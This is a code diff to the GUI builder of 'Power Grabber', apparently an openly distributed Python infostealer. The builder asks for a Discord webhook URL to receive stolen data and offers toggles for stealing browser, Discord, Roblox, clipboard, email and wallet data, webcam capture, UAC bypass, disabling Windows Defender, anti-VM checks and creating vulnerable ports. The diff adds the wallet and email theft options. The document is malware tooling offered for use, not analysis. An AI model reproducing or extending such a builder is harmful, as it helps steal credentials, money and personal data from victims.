@@ -19,7 +19,7 @@ class Power_Grabber(ctk.CTk):
         self.sidebar = ctk.CTkFrame(self, width=300, fg_color='#212127', corner_radius=0)
         self.sidebar.pack(side=RIGHT, fill=Y)
         url = "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
-        ur ="https://github.com/Powercascade/Power-grabber/blob/main/github.png?raw=true"
+        ur ="https://github.com/Powercascade/Power-grabber/blob/main/git.png?raw=true"
         u = "https://github.com/Powercascade/Power-grabber/blob/main/discord-logo.png?raw=true"
         URL = "https://github.com/Powercascade/Power-grabber/blob/main/settings.png?raw=true"
         response = requests.get(url)
@@ -134,13 +134,13 @@ class Power_Grabber(ctk.CTk):
             page,
             width=600,
             height=45,
-            fg_color='#333333',
+            fg_color='#2C2C2C',
             text_color='white',
             placeholder_text='Enter Webhook URL:',
             placeholder_text_color='lightgray',
             border_width=3,
-            corner_radius=20,
-            border_color='#FF3535', 
+            corner_radius=15,
+            border_color='#FF3535',
             font=('Arial', 14, 'bold')
         )
         webhook_entry.pack(pady=(15, 15))
@@ -150,13 +150,13 @@ class Power_Grabber(ctk.CTk):
             page,
             width=600,
             height=45,
-            fg_color='#333333',
+            fg_color='#2C2C2C',
             text_color='white',
             placeholder_text="File name (don't type extension)",
             placeholder_text_color='lightgray',
             border_width=3,
-            corner_radius=20,
-            border_color='#FF3535', 
+            corner_radius=15,
+            border_color='#FF3535',
             font=('Arial', 14, 'bold')
         )
         filename_entry.pack(pady=(15, 25))
@@ -173,10 +173,9 @@ class Power_Grabber(ctk.CTk):
         hr.pack(pady=(0, 10))
         checkbox_options = [
             'Anti VM', 'Annoy Victim (Audio)', 'Browser Info', 'Clipboard contents',
-            'Disable defender (Needs UAC Bypass)', 'Discord Info', 'Discord Injection', 'Exact location',
-            'Games info', 'Kill defender (Needs UAC Bypass)', 'Obfuscate', 'Roblox account', 'Self destruction',
-            'Self exclusion', 'Screenshot', 'System info',
-            'UAC Bypass', 'Vulnerable port creation', 'Webcam', 'Watch Dog'
+            'Disable defender (Needs UAC Bypass)', 'Discord Info', 'Discord Injection', 'Email Addresses', 'Exact location', 
+            'Games info', 'Kill defender (Needs UAC Bypass)', 'Obfuscate', 'Roblox account', 'Self destruction', 'Screenshot', 
+            'System info', 'UAC Bypass', 'Vulnerable port creation', 'Wallets', 'Watch Dog', 'Webcam'
         ]
         checkbox_frame = ctk.CTkFrame(page, fg_color='transparent')
         checkbox_frame.pack(fill=X)
@@ -184,15 +183,22 @@ class Power_Grabber(ctk.CTk):
         for i, option in enumerate(checkbox_options):
             row = i // 3
             col = i % 3
-            checkbox = ctk.CTkCheckBox(checkbox_frame, text=option, width=200, height=32,
-                                                fg_color='#FF3535', text_color='white', 
-                                                border_color='#FF3535', corner_radius=16,
-                                                hover_color='#FF3535',
-                                                checkmark_color='#FFFFFF',
-                                                border_width=1,
-                                                font=('Arial', 12, 'bold', 'italic'),
-                                                text_color_disabled='gray',
-                                                hover=True)
+            checkbox = ctk.CTkCheckBox(
+                checkbox_frame, 
+                text=option, 
+                width=200, 
+                height=32,
+                fg_color='#FF3535', 
+                text_color='white', 
+                border_color='#FF3535', 
+                corner_radius=16,
+                hover_color='#FF3535',
+                checkmark_color='#FFFFFF',
+                border_width=1,
+                font=('Arial', 12, 'bold', 'italic'),
+                text_color_disabled='gray',
+                hover=True
+            )
             checkbox.grid(row=row, column=col, padx=10, pady=5, sticky='w')
             checkbox_dict[option] = checkbox
         anti_vm_checkbox = checkbox_dict['Anti VM']
@@ -202,6 +208,7 @@ class Power_Grabber(ctk.CTk):
         disable_defender_checkbox = checkbox_dict['Disable defender (Needs UAC Bypass)']
         discord_info_checkbox = checkbox_dict['Discord Info']
         discord_injection_checkbox = checkbox_dict['Discord Injection']
+        email_addresses_checkbox = checkbox_dict['Email Addresses']
         exact_location_checkbox = checkbox_dict['Exact location']
         games_info_checkbox = checkbox_dict['Games info']
         kill_defender_checkbox = checkbox_dict['Kill defender (Needs UAC Bypass)']
@@ -209,10 +216,10 @@ class Power_Grabber(ctk.CTk):
         roblox_account_checkbox = checkbox_dict['Roblox account']
         screenshot_checkbox = checkbox_dict['Screenshot']
         self_destruct_checkbox = checkbox_dict['Self destruction']
-        self_exclusion_checkbox = checkbox_dict['Self exclusion']
         system_info_checkbox = checkbox_dict['System info']
         uac_bypass_checkbox = checkbox_dict['UAC Bypass']
         vulnerable_port_creation_checkbox = checkbox_dict['Vulnerable port creation']
+        wallets_checkbox = checkbox_dict['Wallets']
         watchdog_checkbox = checkbox_dict['Watch Dog']
         webcam_checkbox = checkbox_dict['Webcam']
         pumper_frame = ctk.CTkFrame(page, fg_color='transparent')
@@ -243,27 +250,26 @@ class Power_Grabber(ctk.CTk):
         "Disable-Defender": bool(disable_defender_checkbox.get()),
         "Discord-Info": bool(discord_info_checkbox.get()),
         "Discord-Injection": bool(discord_injection_checkbox.get()),
+        "Email-Addresses": bool(email_addresses_checkbox.get()),
         "Exact-location": bool(exact_location_checkbox.get()),
         "Games-Info": bool(games_info_checkbox.get()),
         "Kill-Defender": bool(kill_defender_checkbox.get()),
         "Obfuscate": bool(obfuscate_checkbox.get()),
         "Roblox-Account": bool(roblox_account_checkbox.get()),
         "Self-destruction": bool(self_destruct_checkbox.get()),
-        "Self-exclusion": bool(self_exclusion_checkbox.get()),
         "Screenshot": bool(screenshot_checkbox.get()),
         "System-Info": bool(system_info_checkbox.get()),
         "UAC-Bypass": bool(uac_bypass_checkbox.get()),
         "Vulnerable-port-creation": bool(vulnerable_port_creation_checkbox.get()),
-        "Webcam": bool(webcam_checkbox.get()),
+        "Wallets": bool(wallets_checkbox.get()),
         "Watch-Dog": bool(watchdog_checkbox.get()),
+        "Webcam": bool(webcam_checkbox.get()),
         "Filepumper-Value": pumper_combo.get(),
         "Ping": ping_combo.get(),
             }
-
             with open("config.txt", "w") as file:
                 file.write(f'Webhook: "{webhook_url}"\n')
                 file.write(f'File-Name: "{file_name}.py"\n')
-
                 for option, status in checkbox_statuses.items():
                     file.write(f'{option}: {status}\n')
         build_button = ctk.CTkButton(pumper_frame, text="Build", width=200, height=40,
@@ -311,7 +317,6 @@ class Power_Grabber(ctk.CTk):
     def open_free_vbucks_link(self):
         os.system("start https://www.youtube.com/watch?v=dQw4w9WgXcQ")
         self.show_options_page()
-    
 if __name__ == '__main__':
     app = Power_Grabber()
     app.mainloop()
